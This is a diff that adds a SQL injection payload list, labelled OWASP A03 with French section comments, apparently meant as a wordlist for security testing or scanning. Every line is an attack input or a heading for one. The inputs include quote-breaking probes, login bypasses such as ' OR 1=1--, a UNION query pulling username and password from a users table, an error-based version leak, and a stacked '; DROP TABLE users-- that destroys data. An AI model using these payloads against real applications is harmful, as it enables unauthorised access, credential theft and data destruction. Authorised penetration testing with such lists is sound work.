@@ -1,0 +1,23 @@
+# Payloads SQL Injection - OWASP A03
+# Guillemets simples/doubles pour provoquer erreur
+'
+"
+')
+`
+# Boolean-based
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+' OR 1=1#
+admin'--
+admin' #
+admin'/*
+# UNION-based
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT username,password FROM users--
+1 UNION SELECT 1,2,3--
+# Error-based
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+# Stacked
+'; DROP TABLE users--
